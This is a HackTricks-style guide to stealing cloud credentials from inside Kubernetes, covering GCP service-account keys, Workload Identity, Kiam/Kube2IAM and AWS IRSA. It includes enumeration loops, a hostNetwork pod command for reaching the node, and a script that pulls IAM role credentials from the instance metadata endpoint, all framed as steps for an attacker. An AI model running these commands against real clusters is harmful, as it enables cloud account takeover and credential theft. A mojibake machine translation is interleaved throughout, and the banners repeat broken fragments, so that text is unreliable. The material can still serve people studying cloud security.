

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>æ”¯æŒhacktrickså¹¶è·å¾—å¥½å¤„ï¼</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æ˜¯å¦æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨hacktricks **ä¸­åˆŠç™»å¹¿å‘Šï¼Ÿ è¿˜æ˜¯æ‚¨æƒ³è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„è±Œè±†æˆ–åœ¨pdf **ä¸­ä¸‹è½½hacktricksï¼Ÿ æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**]ï¼ˆhttps://github.com/sponsors/carlospolopï¼‰ï¼

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - å‘ç°[**è±Œè±†å®¶åº­**]ï¼ˆhttps://opensea.io/collection/the-peass-familyï¼‰ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[** nfts **]ï¼ˆhttps://opensea.io/collectionï¼‰ /å®¶åº­å®¶åº­ï¼‰

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - è·å–[**å®˜æ–¹è±Œè±†å’Œhacktricksèµƒç‰©**]ï¼ˆhttps://peass.creator-spring.comï¼‰

- **Join the** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **åŠ å…¥** [**ğŸ’¬**]ï¼ˆhttps://emojipedia.org/speech-balloon/ï¼‰[** discord group **]ï¼ˆhttps://discord.gg/hrep4ruj7fï¼‰æˆ–[ **ç”µæŠ¥ç»„**]ï¼ˆhttps://t.me/peassï¼‰æˆ–**åœ¨** Twitter ** [**ğŸ¦**]ï¼ˆhttps://github.com/carloppolop/hacktrickss on ** twitter **ï¼‰ /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.mdï¼‰eardme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **é€šè¿‡å°†PRSæäº¤ç»™** [** hacktricks github repo **]ï¼ˆhttps://github.com/carloppolop/hacktricksï¼‰**ã€‚

</details>


# GCP

If you are running a k8s cluster inside GCP you will probably want that some application running inside the cluster has some access to GCP. There are 2 common ways of doing that:

å¦‚æœæ‚¨åœ¨GCPå†…è¿è¡ŒK8Sç¾¤é›†ï¼Œåˆ™å¯èƒ½å¸Œæœ›æŸäº›åœ¨é›†ç¾¤ä¸­è¿è¡Œçš„åº”ç”¨ç¨‹åºå¯ä»¥è®¿é—®GCPã€‚ æœ‰2ç§å¸¸è§çš„æ–¹æ³•ï¼š

## Mounting GCP-SA keys as secret

##å°†GCP-SAé”®å®‰è£…ä¸ºç§˜å¯†

A common way to give **access to a kubernetes application to GCP** is to:

å°†**è®¿é—®Kubernetesç”³è¯·è®¿é—®GCP **çš„ä¸€ç§å¸¸è§æ–¹æ³•æ˜¯ï¼š

* Create a GCP Service Account

*åˆ›å»ºä¸€ä¸ªGCPæœåŠ¡å¸æˆ·
* Bind on it the desired permissions

*ç»‘å®šæ‰€éœ€çš„æƒé™
* Download a json key of the created SA

*ä¸‹è½½åˆ›å»ºSAçš„JSONå¯†é’¥
* Mount it as a secret inside the pod

*å°†å…¶ä½œä¸ºç§˜å¯†å›ºå®šåœ¨è±†èšå†…
* Set the GOOGLE\_APPLICATION\_CREDENTIALS environment variable pointing to the path where the json is.

*è®¾ç½®Google \ _application \ _credentialsç¯å¢ƒå˜é‡æŒ‡å‘JSONæ‰€åœ¨çš„è·¯å¾„ã€‚

{% hint style="warning" %}

{ï¼…æç¤ºæ ·å¼=â€œè­¦å‘Šâ€ï¼…}
Therefore, as an **attacker**, if you compromise a container inside a pod, you should check for that **env** **variable** and **json** **files** with GCP credentials.

å› æ­¤ï¼Œä½œä¸ºä¸€ä¸ª**æ”»å‡»è€…**ï¼Œå¦‚æœæ‚¨åœ¨åŠèˆ±å†…å¦¥åå®¹å™¨ï¼Œåˆ™åº”æ£€æŸ¥** env ** **å˜é‡**å’Œ** json ** ** **æ–‡ä»¶**ä½¿ç”¨GCPå‡­æ®**ã€‚
{% endhint %}

## GKE Workload Identity

## GKEå·¥ä½œè´Ÿè½½èº«ä»½

With Workload Identity, we can configure a[ Kubernetes service account](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) to act as a[ Google service account](https://cloud.google.com/iam/docs/understanding-service-accounts). Pods running with the Kubernetes service account will automatically authenticate as the Google service account when accessing Google Cloud APIs.

ä½¿ç”¨Workload Identityï¼Œæˆ‘ä»¬å¯ä»¥é…ç½®[KubernetesæœåŠ¡å¸æˆ·]ï¼ˆhttps://kubernetes.io/docs/tasks/tasks/configure-pod-container/configure-service-account/ï¼‰ä½œä¸º[Google Service Serviceå¸æˆ·]ï¼ˆHTTTPSï¼‰ ï¼š//cloud.google.com/iam/docs/understanding-service-accountsï¼‰ã€‚ è®¿é—®Google Cloud APIæ—¶ï¼Œä½¿ç”¨KubernetesæœåŠ¡å¸æˆ·è¿è¡Œçš„PODå°†è‡ªåŠ¨ä½œä¸ºGoogleæœåŠ¡å¸æˆ·èº«ä»½éªŒè¯ã€‚

The **first series of steps** to enable this behaviour is to **enable Workload Identity in GCP** ([**steps**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) and create the GCP SA you want k8s to impersonate.

å¯ç”¨æ­¤è¡Œä¸ºçš„**ç¬¬ä¸€ç³»åˆ—æ­¥éª¤**æ˜¯**åœ¨GCP **ä¸­å¯ç”¨å·¥ä½œè´Ÿè½½èº«ä»½ï¼ˆ[**æ­¥éª¤**]ï¼ˆhttps://medium.com/zeotap-customer-intelligence-unleashed/gke -workload-nidentity-a-secure-secure-for-gke-applications to-access-ccess-gcp-services-f880f4e74e8cï¼‰ï¼‰å¹¶åˆ›å»ºæ‚¨æƒ³è¦K8çš„GCP SAã€‚

The **second steps** is to relate a K8s SA (KSA) with the GCP SA (GSA):

**ç¬¬äºŒæ­¥**æ˜¯å°†K8S SAï¼ˆKSAï¼‰ä¸GCP SAï¼ˆGSAï¼‰ç›¸å…³è”ï¼š

* Create the KSA (normally in the **annotations appear the email of the GSA**) and use it in the pod you would like to:

*åˆ›å»ºKSAï¼ˆé€šå¸¸åœ¨**æ³¨é‡Šä¸­å‡ºç°GSA **çš„ç”µå­é‚®ä»¶ï¼‰ï¼Œå¹¶å°†å…¶åœ¨æ‚¨æƒ³è¦çš„PODä¸­ä½¿ç”¨ï¼š

```yaml
# serviceAccount.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
    annotations:    
        iam.gke.io/gcp-service-account: $GSA-NAME@PROJECT-ID.iam.gserviceaccount.com
    name: $APPNAME
    namespace: $NAMESPACE
```

* Create the KSA - GSA Binding:

*åˆ›å»ºKSA -GSAç»‘å®šï¼š

```bash
gcloud iam service-accounts   \
  --role roles/iam.workloadIdentityUser \
  --member "serviceAccount:PROJECT-ID.svc.id.goog[$NAMESPACE/$KSA-NAME]" \
  $GSA-NAME@PROJECT-ID.iam.gserviceaccount.com
```

Note how you are creating a binding and in the **member field you can find the namespace and KSA name**.

è¯·æ³¨æ„æ‚¨å¦‚ä½•åˆ›å»ºç»‘å®šï¼Œåœ¨**æˆå‘˜å­—æ®µä¸­æ‚¨å¯ä»¥æ‰¾åˆ°åç§°ç©ºé—´å’Œksaåç§°**ã€‚

{% hint style="warning" %}

{ï¼…æç¤ºæ ·å¼=â€œè­¦å‘Šâ€ï¼…}
As an attacker inside K8s you should **search for SAs** with the **`iam.gke.io/gcp-service-account` annotation** as that indicates that the SA can access something in GCP. Another option would be to try to abuse each KSA in the cluster and check if it has access.\

ä½œä¸ºK8Så†…éƒ¨çš„æ”»å‡»è€…ï¼Œæ‚¨åº”è¯¥**ä½¿ç”¨**``iam.gke.io/gcp-service-account`æ³¨é‡Š**æœç´¢SAS **ï¼Œå› ä¸ºè¿™è¡¨æ˜SAå¯ä»¥åœ¨GCPä¸­è®¿é—®æŸäº›ä¸œè¥¿ã€‚ å¦ä¸€ä¸ªé€‰é¡¹æ˜¯å°è¯•æ»¥ç”¨ç¾¤é›†ä¸­çš„æ¯ä¸ªKSAå¹¶æ£€æŸ¥æ˜¯å¦è®¿é—®ã€‚\ \
From GCP is always interesting to enumerate the bindings and know **which access are you giving to SAs inside Kubernetes**.

æ¥è‡ªGCPæ€»æ˜¯å¾ˆæœ‰è¶£çš„æ˜¯åˆ—ä¸¾ç»‘å®šå¹¶çŸ¥é“**æ‚¨å¯¹Kuberneteså†…çš„SASæä¾›äº†å“ªäº›è®¿é—®**ã€‚
{% endhint %}

This is a script to easily **iterate over the all the pods** definitions **looking** for that **annotation**:

è¿™æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œå¯ä»¥è½»æ¾åœ°**è¿­ä»£æ‰€æœ‰PODS **å®šä¹‰** ** ** **æ³¨é‡Š**ï¼š

```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
    for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
        echo "Pod: $ns/$pod"
        kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
        echo ""
        echo ""
    done
done | grep -B 1 "gcp-service-account"
```

# AWS

## Kiam & Kube2IAM (IAM role for Pods)  <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

## kiamï¼†kube2iamï¼ˆpodsçš„iamè§’è‰²ï¼‰<a href="#workflow of-am-lole-for-service-accounts" id="workflow of-am-iam-lole-lole-lole-for-service-accounts"> <<<<<<<<<<<< /a>

An (outdated) way to give IAM Roles to Pods is to use a [**Kiam**](https://github.com/uswitch/kiam) or a [**Kube2IAM**](https://github.com/jtblin/kube2iam) **server.** Basically you will need to run a **daemonset** in your cluster with a **kind of privileged IAM role**. This daemonset will be the one that will give access to IAM roles to the pods that need it.

å°†IAMè§’è‰²èµ‹äºˆPODçš„ä¸€ç§ï¼ˆè¿‡æ—¶çš„ï¼‰æ–¹æ³•æ˜¯ä½¿ç”¨[** kiam **]ï¼ˆhttps://github.com/uswitch/kiamï¼‰æˆ–[** kube2iam **]ï¼ˆhttpsï¼š// github ã€‚ è¿™ä¸ªå®ˆæŠ¤ç¨‹åºå°†æ˜¯å°†IAMè§’è‰²è®¿é—®éœ€è¦çš„è±†èšçš„å«å£«ã€‚

First of all you need to configure **which roles can be accessed inside the namespace**, and you do that with an annotation inside the namespace object:

é¦–å…ˆï¼Œæ‚¨éœ€è¦é…ç½®**å¯ä»¥åœ¨å‘½åç©ºé—´**å†…è®¿é—®å“ªä¸ªè§’è‰²ï¼Œç„¶ååœ¨å‘½åç©ºé—´å¯¹è±¡ä¸­ä½¿ç”¨æ³¨é‡Šæ¥æ‰§è¡Œæ­¤æ“ä½œï¼š

{% code title="Kiam" %}

{ï¼…ä»£ç æ ‡é¢˜=â€œ kiamâ€ï¼…}
```yaml
kind: Namespace
metadata:
  name: iam-example
  annotations:
    iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}

{ï¼…ä»£ç æ ‡é¢˜=â€œ kube2iamâ€ï¼…}
```yaml
apiVersion: v1
kind: Namespace
metadata:
  annotations:
    iam.amazonaws.com/allowed-roles: |
      ["role-arn"]
  name: default
```
{% endcode %}

Once the namespace is configured with the IAM roles the Pods can have you can **indicate the role you want on each pod definition with something like**:

ä¸€æ—¦å°†å‘½åç©ºé—´é…ç½®ä¸ºPODå¯ä»¥æ‹¥æœ‰çš„IAMè§’è‰²ï¼Œæ‚¨å¯ä»¥**æŒ‡ç¤ºæ‚¨åœ¨æ¯ä¸ªPODå®šä¹‰ä¸Šæ‰€éœ€çš„è§’è‰²ï¼Œå¹¶ä½¿ç”¨ç±»ä¼¼**çš„å†…å®¹æ¥æŒ‡ç¤ºæ‚¨æƒ³è¦çš„è§’è‰²ï¼š

{% code title="Kiam & Kube2iam" %}

{ï¼…ä»£ç æ ‡é¢˜=â€œ Kiamï¼†Kube2iamâ€ï¼…}
```yaml
kind: Pod
metadata:
  name: foo
  namespace: external-id-example
  annotations:
    iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}

{ï¼…æç¤ºæ ·å¼=â€œè­¦å‘Šâ€ï¼…}
As an attacker, if you **find these annotations** in pods or namespaces or a kiam/kube2iam server running (in kube-system probably) you can **impersonate every r**ole that is already **used by pods** and more (if you have access to AWS account enumerate the roles).

ä½œä¸ºæ”»å‡»è€…ï¼Œå¦‚æœæ‚¨**åœ¨PODæˆ–åç§°ç©ºé—´æˆ–è¿è¡ŒKiam/Kube2IAMæœåŠ¡å™¨ï¼ˆå¯èƒ½åœ¨Kube-Systemä¸­ï¼‰ä¸­æ‰¾åˆ°è¿™äº›æ³¨é‡Š**ï¼Œåˆ™å¯ä»¥**æ¨¡ä»¿PODS*å·²ä½¿ç”¨çš„æ¯ä¸ªr ** ole ** ** ** *ä»¥åŠæ›´å¤šï¼ˆå¦‚æœæ‚¨å¯ä»¥è®¿é—®AWSå¸æˆ·åˆ—ä¸¾è§’è‰²ï¼‰ã€‚
{% endhint %}

### Create Pod with IAM Role

###åˆ›å»ºå¸¦æœ‰IAMè§’è‰²çš„POD

{% hint style="info" %}

{ï¼…æç¤ºæ ·å¼=â€œ infoâ€ï¼…}
The IAM role to indicate must be in the same AWS account as the kiam/kube2iam role and that role must be able to access it.

IAMè¡¨æ˜å¿…é¡»ä¸Kiam/Kube2iamè§’è‰²ç›¸åŒçš„AWSå¸æˆ·ï¼Œå¹¶ä¸”è¯¥è§’è‰²å¿…é¡»èƒ½å¤Ÿè®¿é—®å®ƒã€‚
{% endhint %}

```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
  annotations:
    iam.amazonaws.com/role: transaction-metadata
  name: alpine
  namespace: eevee
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 100000"]' | kubectl apply -f -
```

## Workflow of IAM role for Service Accounts via OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

##é€šè¿‡OIDC <a href="#workflow of-iam-lole-for-service-accounts" id=" workflow-of-iam-lole-lole-service-service-accounts"> << /a>

This is the recommended way by AWS.

è¿™æ˜¯AWSæ¨èçš„æ–¹å¼ã€‚

1. First of all you need to [create an OIDC provider for the cluster](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).

1.é¦–å…ˆï¼Œæ‚¨éœ€è¦[ä¸ºç¾¤é›†åˆ›å»ºä¸€ä¸ªOIDCæä¾›å•†]ï¼ˆhttps://docs.aws.aws.amazon.com/eks/latest/userguide/enable-iam--iam-roles-for-for-service-accounts.htmlï¼‰ ã€‚
2. Then you create an IAM role with the permissions the SA will require.

2.ç„¶åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨SAæ‰€éœ€çš„æƒé™åˆ›å»ºIAMè§’è‰²ã€‚
3. Create a [trust relationship between the IAM role and the SA](https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts-technical-overview.html) name (or the namespaces giving access to the role to all the SAs of the namespace). _The trust relationship will mainly check the OIDC provider name, the namespace name and the SA name_.

3.å»ºç«‹[IAMè§’è‰²å’ŒSAä¹‹é—´çš„ä¿¡ä»»å…³ç³»]ï¼ˆhttps://docs.aws.aws.amazon.com/eks/latest/userguide/IAM-Roles-for-service-service-accounts-technical-overview.htmlï¼‰ åç§°ï¼ˆæˆ–å‘½åç©ºé—´å¯ä»¥è®¿é—®è¯¥åç§°ç©ºé—´çš„æ‰€æœ‰SAçš„è§’è‰²ï¼‰ã€‚ _ä¿¡ä»»å…³ç³»å°†ä¸»è¦æ£€æŸ¥OIDCæä¾›å•†åç§°ï¼Œåç§°åç§°å’ŒSAåç§°_ã€‚
4. Finally, **create a SA with an annotation indicating the ARN of the role**, and the pods running with that SA will have **access to the token of the role**. The **token** is **written** inside a file and the path is specified in **`AWS_WEB_IDENTITY_TOKEN_FILE`** (default: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)

4.æœ€åï¼Œ**åˆ›å»ºä¸€ä¸ªå¸¦æœ‰æ³¨é‡Šçš„saï¼ŒæŒ‡ç¤ºè§’è‰²çš„arn **ï¼Œå¹¶ä¸”ä¸SAä¸€èµ·è¿è¡Œçš„è±†èšå°†å¯ä»¥**è®¿é—®è§’è‰²çš„ä»¤ç‰Œ**ã€‚ **ä»¤ç‰Œ**æ˜¯**ç¼–å†™**çš„æ–‡ä»¶ï¼Œå¹¶ä¸”è·¯å¾„åœ¨** a aws_web_identity_token_file` ** **ï¼ˆé»˜è®¤å€¼ï¼š`/var/run/necrets/eks.amazonaws.com/serviceaccount/token`ï¼‰ä¸­æŒ‡å®šã€‚

(You can find an example of this configuration [here](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/))

ï¼ˆæ‚¨å¯ä»¥æ‰¾åˆ°æ­¤é…ç½®çš„ç¤ºä¾‹[æ­¤å¤„]ï¼ˆhttps://blogs.halodoc.io/iam-roles-for-service-accounts-2/ï¼‰ï¼‰

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  annotations:
    eks.amazonaws.com/role-arn: arn:aws-cn:iam::ACCOUNT_ID:role/IAM_ROLE_NAME
```

{% hint style="warning" %}

{ï¼…æç¤ºæ ·å¼=â€œè­¦å‘Šâ€ï¼…}
As an attacker, if you can enumerate a K8s cluster, check for **service accounts with that annotation** to **escalate to AWS**. To do so, just **exec/create** a **pod** using one of the IAM **privileged service accounts** and steal the token.

ä½œä¸ºæ”»å‡»è€…ï¼Œå¦‚æœæ‚¨å¯ä»¥æšä¸¾K8Sç¾¤é›†ï¼Œè¯·æ£€æŸ¥**ä½¿ç”¨è¯¥æ³¨é‡Š**çš„**æœåŠ¡å¸æˆ·ï¼Œä»¥å‡çº§ä¸ºAWS **ã€‚ ä¸ºæ­¤ï¼Œåªéœ€ä½¿ç”¨IAM **ç‰¹æƒæœåŠ¡å¸æˆ·ä¹‹ä¸€** exec/åˆ›å»º** a ** pod **å¹¶çªƒå–ä»¤ç‰Œã€‚

Moreover, if you are inside a pod, check for env variables like **AWS\_ROLE\_ARN** and **AWS\_WEB\_IDENTITY\_TOKEN.**

æ­¤å¤–ï¼Œå¦‚æœæ‚¨åœ¨åŠèˆ±å†…ï¼Œè¯·æ£€æŸ¥envå˜é‡ï¼Œä¾‹å¦‚** aws \ _role \ _arn **å’Œ** aws \ _web \ _ nidentity \ _tokenã€‚


{% endhint %}

## Find Pods a SAs with IAM Roles in the Cluster

##åœ¨é›†ç¾¤ä¸­æŸ¥æ‰¾å…·æœ‰IAMè§’è‰²çš„SAS

This is a script to easily **iterate over the all the pods and sas** definitions **looking** for that **annotation**:

è¿™æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œå¯ä»¥è½»æ¾åœ°**è¿­ä»£æ‰€æœ‰PODå’ŒSAS **å®šä¹‰** ** for ** and **æ³¨é‡Š**ï¼š

```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
    for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
        echo "Pod: $ns/$pod"
        kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
        echo ""
        echo ""
    done
    for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
        echo "SA: $ns/$sa"
        kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
        echo ""
        echo ""
    done
done | grep -B 1 "amazonaws.com"
```

## Node IAM Role

The previos section was about how to steal IAM Roles with pods, but note that a **Node of the** K8s cluster is going to be an **instance inside the cloud**. This means that the Node is highly probable going to **have a new IAM role you can steal** (_note that usually all the nodes of a K8s cluster will have the same IAM role, so it might not be worth it to try to check on each node_).

Previoséƒ¨åˆ†æ˜¯å…³äºå¦‚ä½•ä½¿ç”¨Podçªƒå–IAMè§’è‰²çš„ï¼Œä½†æ˜¯è¯·æ³¨æ„ï¼Œ** K8Sç¾¤é›†çš„ä¸€ä¸ª**èŠ‚ç‚¹å°†æ˜¯äº‘**å†…çš„**å®ä¾‹ã€‚ è¿™æ„å‘³ç€è¯¥èŠ‚ç‚¹å¾ˆå¯èƒ½ä¼š**æœ‰ä¸€ä¸ªæ–°çš„IAMè§’è‰²ï¼Œæ‚¨å¯ä»¥çªƒå–**ï¼ˆ_ noteé€šå¸¸ï¼ŒK8Sç¾¤é›†çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½ä¼šå…·æœ‰ç›¸åŒçš„IAMè§’è‰²ï¼Œå› æ­¤å¯èƒ½ä¸å€¼å¾—å°è¯•å°è¯•å°è¯•ã€‚ æ£€æŸ¥æ¯ä¸ªèŠ‚ç‚¹_ï¼‰ã€‚

There is however an important requirement to access the metadata endpoint from the node, you need to be in the node (ssh session?) or at least have the same network:

ä½†æ˜¯ï¼Œä»èŠ‚ç‚¹è®¿é—®å…ƒæ•°æ®ç«¯ç‚¹çš„é‡è¦è¦æ±‚ï¼Œæ‚¨éœ€è¦åœ¨èŠ‚ç‚¹ï¼ˆSSHä¼šè¯ï¼Ÿï¼‰ä¸­æˆ–è‡³å°‘å…·æœ‰ç›¸åŒçš„ç½‘ç»œï¼š

```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```

## Steal IAM Role Token

Previously we have discussed how to **attach IAM Roles to Pods** or even how to **escape to the Node to steal the IAM Role** the instance has attached to it.

ä»¥å‰ï¼Œæˆ‘ä»¬å·²ç»è®¨è®ºäº†å¦‚ä½•å°†IAMè§’è‰²é™„åŠ åˆ°Pods **ï¼Œç”šè‡³å¦‚ä½•**é€ƒåˆ°èŠ‚ç‚¹ä¸Šçªƒå–IAMè§’è‰²**è¯¥å®ä¾‹å·²é™„åŠ åˆ°å®ƒã€‚

You can use the following script to **steal** your new hard worked **IAM role credentials**:

æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è„šæœ¬**çªƒå–**æ‚¨çš„æ–°åŠªåŠ›** iamè§’è‰²å‡­æ®**ï¼š

```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
    echo "IAM Role discovered: $IAM_ROLE_NAME"
    if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
        echo "Credentials:"
        curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
    fi
fi
```

# References

* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)


<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>æ”¯æŒhacktrickså¹¶è·å¾—å¥½å¤„ï¼</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æ˜¯å¦æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨hacktricks **ä¸­åˆŠç™»å¹¿å‘Šï¼Ÿ è¿˜æ˜¯æ‚¨æƒ³è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„è±Œè±†æˆ–åœ¨pdf **ä¸­ä¸‹è½½hacktricksï¼Ÿ æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**]ï¼ˆhttps://github.com/sponsors/carlospolopï¼‰ï¼

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - å‘ç°[**è±Œè±†å®¶åº­**]ï¼ˆhttps://opensea.io/collection/the-peass-familyï¼‰ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[** nfts **]ï¼ˆhttps://opensea.io/collectionï¼‰ /å®¶åº­å®¶åº­ï¼‰

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - è·å–[**å®˜æ–¹è±Œè±†å’Œhacktricksèµƒç‰©**]ï¼ˆhttps://peass.creator-spring.comï¼‰

- **Join the** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **åŠ å…¥** [**ğŸ’¬**]ï¼ˆhttps://emojipedia.org/speech-balloon/ï¼‰[** discord group **]ï¼ˆhttps://discord.gg/hrep4ruj7fï¼‰æˆ–[ **ç”µæŠ¥ç»„**]ï¼ˆhttps://t.me/peassï¼‰æˆ–**åœ¨** Twitter ** [**ğŸ¦**]ï¼ˆhttps://github.com/carloppolop/hacktrickss on ** twitter **ï¼‰ /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.mdï¼‰eardme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **é€šè¿‡å°†PRSæäº¤ç»™** [** hacktricks github repo **]ï¼ˆhttps://github.com/carloppolop/hacktricksï¼‰**ã€‚

</details>


